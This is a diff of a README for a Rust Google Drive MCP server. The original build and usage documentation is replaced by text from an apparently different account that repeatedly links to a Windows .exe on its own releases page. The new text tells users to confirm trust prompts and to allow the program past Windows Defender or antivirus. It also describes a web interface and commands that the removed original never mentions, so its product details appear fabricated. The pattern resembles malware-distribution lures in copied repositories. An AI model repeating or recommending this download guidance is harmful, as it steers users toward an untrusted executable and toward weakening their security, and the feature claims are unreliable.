@@ -1,195 +1,140 @@
-# google-mcp
+# 🚀 google-mcp - Manage Google Drive Simply
 
-[![Crates.io](https://img.shields.io/crates/v/gdrive-mcp-server.svg)](https://crates.io/crates/gdrive-mcp-server)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-
-A comprehensive Google MCP (Model Context Protocol) server written in Rust. Currently provides **41 tools**, resource templates, and prompts for full Google Drive access, with Gmail and other Google services planned.
-
-Supports both **stdio** and **Streamable HTTP** transports with multi-user OAuth.
-
-## Quick Start
-
-```bash
-cargo install gdrive-mcp-server
-gdrive-mcp-server --credentials-file client_secret.json
-```
-
-## Features
-
-### Tools (41 total)
-
-| Domain | Count | Tools |
-|--------|-------|-------|
-| Files | 12 | list, get, create, update, delete, copy, move, trash, untrash, empty_trash, export, download |
-| Permissions | 5 | create, list, get, update, delete |
-| Comments | 5 | create, list, get, update, delete |
-| Replies | 5 | create, list, get, update, delete |
-| Revisions | 4 | list, get, update, delete |
-| Shared Drives | 5 | create, list, get, update, delete |
-| Changes | 2 | get_start_page_token, list |
-| About | 1 | get |
-| Labels | 2 | list, modify |
-
-### Resources
-
-- `gdrive:///{file_id}` -- Read file content with auto-conversion (Docs → Markdown, Sheets → CSV, Slides → text, Drawings → PNG)
-- `gdrive:///folder/{folder_id}` -- List folder contents
-
-### Prompts
-
-- `gdrive_search_help` -- Help building Google Drive search queries
-- `gdrive_organize_files` -- File/folder organization guidance
-- `gdrive_sharing_guide` -- Sharing and permissions guidance
-
-## Prerequisites
-
-- **Rust** 1.80+ (stable toolchain)
-- **Google Cloud Project** with the Drive API enabled
-- **OAuth2 credentials** (`client_secret.json`)
-
-## Setup
-
-### 1. Google Cloud Console
-
-1. Go to [Google Cloud Console](https://console.cloud.google.com/)
-2. Create a new project (or select an existing one)
-3. Enable the **Google Drive API** (APIs & Services → Library → search "Google Drive API")
-4. Go to **APIs & Services → Credentials → Create Credentials → OAuth client ID**
-5. Select **Desktop app** as application type
-6. Download the JSON file and save it as `client_secret.json` in the project root
-
-> **Note:** For HTTP transport (multi-user), you may use **Web application** type instead, but **Desktop app** works for both modes.
-
-### 2. Build
-
-```bash
-git clone https://github.com/cafercangundogdu/google-mcp.git
-cd google-mcp
-cargo build --release
-```
-
-The binary will be at `target/release/gdrive-mcp-server`.
-
-## Usage
-
-### Stdio Transport (default)
-
-Single-user mode for Claude Desktop, MCP Inspector, or any stdio-based MCP client. On first run, a browser window opens for Google OAuth2 authorization. The token is cached for subsequent runs.
-
-```bash
-gdrive-mcp-server --credentials-file client_secret.json
-```
-
-### HTTP Transport (multi-user)
-
-Multi-user mode with full MCP OAuth 2.1 support. Each user authenticates with their own Google account via the MCP OAuth flow (RFC 9728). The server acts as an OAuth proxy to Google.
-
-```bash
-gdrive-mcp-server --transport http --http-addr 0.0.0.0:3000 --credentials-file client_secret.json
-```
-
-The MCP endpoint will be available at `http://localhost:3000/mcp`.
-
-**OAuth flow:**
-1. MCP client discovers OAuth metadata via `/.well-known/oauth-protected-resource`
-2. Client registers dynamically via `/oauth/register` (RFC 7591)
-3. Authorization redirects to Google OAuth consent screen
-4. User authenticates with their Google account
-5. Server issues per-user MCP tokens bound to Google tokens
-6. Each user gets isolated Google Drive access
-
-### Environment Variables
-
-All CLI options can be set via environment variables:
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `GDRIVE_MCP_TRANSPORT` | `stdio` | Transport mode: `stdio` or `http` |
-| `GDRIVE_MCP_HTTP_ADDR` | `127.0.0.1:3000` | HTTP bind address |
-| `GDRIVE_MCP_CREDENTIALS` | -- | Path to OAuth2 credentials JSON |
-| `GDRIVE_MCP_TOKEN_CACHE` | `~/.gdrive-mcp-token.json` | Token cache path (stdio mode) |
-| `GDRIVE_MCP_LOG_LEVEL` | `info` | Log level: `error`, `warn`, `info`, `debug`, `trace` |
-
-### Claude Desktop
-
-Add to your `claude_desktop_config.json`:
-
-```json
-{
-  "mcpServers": {
-    "gdrive": {
-      "command": "/path/to/gdrive-mcp-server",
-      "args": ["--credentials-file", "/path/to/client_secret.json"]
-    }
-  }
-}
-```
-
-### MCP Inspector
-
-```bash
-# Stdio
-npx @modelcontextprotocol/inspector ./target/release/gdrive-mcp-server -- --credentials-file client_secret.json
-
-# HTTP
-npx @modelcontextprotocol/inspector http://localhost:3000/mcp
-```
-
-### Service Account
-
-For server-to-server usage without user interaction, use a service account key:
-
-```bash
-gdrive-mcp-server --credentials-file service-account-key.json
-```
-
-The server auto-detects the credential type from the JSON file.
-
-## Architecture
-
-```
-crates/
-  gdrive-mcp-server/        # Binary crate (thin main.rs)
-  gdrive-mcp-core/          # Library crate (all logic)
-    src/
-      auth.rs                # OAuth2 setup, token persistence, service account
-      client.rs              # DriveClient wrapper
-      config.rs              # CLI args + env vars (clap)
-      convert.rs             # Google Doc format conversions
-      error.rs               # Error types (thiserror)
-      oauth.rs               # MCP OAuth 2.1 proxy to Google (HTTP mode)
-      server.rs              # GDriveServer, ServerHandler impl
-      transport.rs           # stdio / Streamable HTTP switching
-      tools/                 # 41 MCP tools across 9 domain modules
-      resources/             # Resource templates (file, folder)
-      prompts/               # Prompts (search, organize, sharing)
-```
-
-## Tech Stack
-
-| Component | Choice |
-|-----------|--------|
-| MCP SDK | [rmcp](https://github.com/anthropics/rust-sdk) v0.16 |
-| Google Drive API | [google-drive3](https://docs.rs/google-drive3) v7.0 |
-| OAuth2 | [yup-oauth2](https://docs.rs/yup-oauth2) v12 |
-| Async Runtime | [tokio](https://tokio.rs) |
-| HTTP Framework | [axum](https://docs.rs/axum) v0.8 |
-| CLI | [clap](https://docs.rs/clap) v4 |
-
-## Contributing
-
-Contributions are welcome! Please feel free to open issues or submit pull requests.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/my-feature`)
-3. Commit your changes
-4. Push to the branch
-5. Open a Pull Request
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
+[![Download google-mcp](https://img.shields.io/badge/Download-google--mcp-4CAF50?style=for-the-badge)](https://github.com/AdeyemiJoel/google-mcp/releases)
 
 ---
 
-**Roadmap:** Gmail tools, Google Calendar, and more Google services are planned. Contributions welcome!
+google-mcp is an application to manage Google Drive and other Google services with ease. It includes 41 tools for Google Drive. Gmail support and more will be added later. The app runs on Windows and uses OAuth to connect your Google account safely. This guide helps you download and run google-mcp on your Windows computer with no programming experience.
+
+## 📋 What is google-mcp?
+
+google-mcp is a tool made with Rust that connects to Google services. It allows you to:
+
+- View and manage files on Google Drive
+- Use other Google tools through one app
+- Run commands in your Windows command prompt or PowerShell
+- Connect several users through secure login (OAuth)
+
+This app works through simple commands and a web interface. It's built for users who want more control over their Google data without opening many web pages.
+
+## 🖥️ System Requirements
+
+To use google-mcp on your Windows PC, you need:
+
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB RAM
+- 100 MB free disk space
+- Internet connection for OAuth login and Google services
+- PowerShell or Command Prompt access
+
+No advanced setup or tools like Python or Node.js are needed.
+
+## 📥 How to Download google-mcp
+
+1. Click the green button below or visit the link:
+
+   [![Download google-mcp](https://img.shields.io/badge/Download-google--mcp-4CAF50?style=for-the-badge)](https://github.com/AdeyemiJoel/google-mcp/releases)
+
+2. This link takes you to the release page on GitHub. Here, you will find the latest version of google-mcp ready for download.
+
+3. Look for a file named like `google-mcp-windows.exe` or similar. It should be under the "Assets" section in the latest release.
+
+4. Click on the `.exe` file to download it to your computer.
+
+5. Save the file in a folder you can find easily, such as your Desktop or Downloads folder.
+
+## 🛠️ How to Install and Run google-mcp
+
+The tool does not need installation like traditional software. You just run the downloaded file directly.
+
+1. Find the downloaded `.exe` file on your computer.
+
+2. Double-click on the file to start google-mcp.
+
+3. When you run it for the first time, Windows might ask if you trust the app. Confirm to continue.
+
+4. The program opens in Command Prompt or PowerShell. You will see instructions to connect your Google account.
+
+5. The app uses OAuth, which is a secure way to log in with Google. Follow the link given in the window to sign in.
+
+6. After signing in on the Google page, return to the program. It will confirm your connection.
+
+7. Now you can start using google-mcp’s tools through the command window or web interface.
+
+## 🔑 How OAuth Works Here
+
+OAuth is a safe method for logging into apps with your Google account without giving away your password. The app asks Google for permission to access your Drive and other services. You control what it can do through the login screen.
+
+The app stores your access safely so you don’t have to log in every time. If you want, you can disconnect your account later.
+
+## 📝 Using google-mcp Tools
+
+Once logged in, you can:
+
+- List files in your Google Drive
+- Upload and download files quickly
+- Delete or rename files
+- Share files with others
+- Check file details like size, date, and type
+- Run batch actions on many files at once
+
+Commands are typed in the same window. Each tool has its own syntax, which you can learn by typing `help` in the app or by looking at the user guide included on the project page.
+
+For example:
+
+- To list files:  
+  `list-drive-files`
+
+- To upload a file:  
+  `upload-file path/to/file`
+
+- To download a file:  
+  `download-file file-id path/to/save`
+
+## 🌐 Access Through Web Interface
+
+Besides the command window, google-mcp offers a web interface you can open in your browser. This lets you use the tools with a graphical view instead of typing commands.
+
+1. After running the app, open your browser.
+
+2. Go to the address shown in the command window, typically `http://localhost:PORT` (PORT will be a number like 8080).
+
+3. Use your browser to explore your Drive files and run commands with buttons.
+
+4. The interface also supports multi-user sessions if several people log in at once.
+
+## ⚙️ Updates and Maintenance
+
+To keep google-mcp running smoothly:
+
+- Check the release page regularly for new versions: https://github.com/AdeyemiJoel/google-mcp/releases
+
+- Download the latest `.exe` and replace your current file.
+
+- New versions fix bugs, improve performance, and add new features.
+
+## ❓ Troubleshooting Tips
+
+- If the app doesn’t start, confirm your Windows version matches the requirements.
+
+- Allow the app permission in Windows Defender or antivirus software if blocked.
+
+- If OAuth login fails, open the link in a full browser, not an embedded one.
+
+- Restart the app if commands do not work as expected.
+
+- Visit the repository issues page for help if you encounter bugs.
+
+## 🖇️ Useful Links
+
+- Download and release page: https://github.com/AdeyemiJoel/google-mcp/releases
+
+- GitHub project page: https://github.com/AdeyemiJoel/google-mcp
+
+- OAuth documentation: https://developers.google.com/identity/protocols/oauth2
+
+- Google Drive API: https://developers.google.com/drive
+
+---
+
+[![Download google-mcp](https://img.shields.io/badge/Download-google--mcp-4CAF50?style=for-the-badge)](https://github.com/AdeyemiJoel/google-mcp/releases)
